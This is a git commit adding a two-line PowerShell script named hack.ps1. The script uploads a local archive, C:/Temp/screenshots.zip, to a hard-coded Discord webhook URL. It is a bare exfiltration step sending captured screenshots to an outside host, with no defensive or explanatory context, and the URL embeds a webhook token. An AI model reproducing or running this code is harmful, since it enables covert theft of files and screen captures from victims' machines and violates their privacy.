e77ad26bf3f3c19bd7e41004ca3ce3740f8eb21b
Cu3nz <sergiogallegit@gmail.com>
2025-03-27 00:33:44 +0100

    Script

---
+++ hack.ps1
@@ -0,0 +1,2 @@
+$wc = New-Object System.Net.WebClient
+$wc.UploadFile('https://discord.com/api/webhooks/1354483320221863937/4mfg8Jb3pHp7OQxiywFBRV3eCVTD9rHz0A6ce6cGVNkxW7G1NHkQyMQKF5rosHSMPyit','POST','C:/Temp/screenshots.zip')
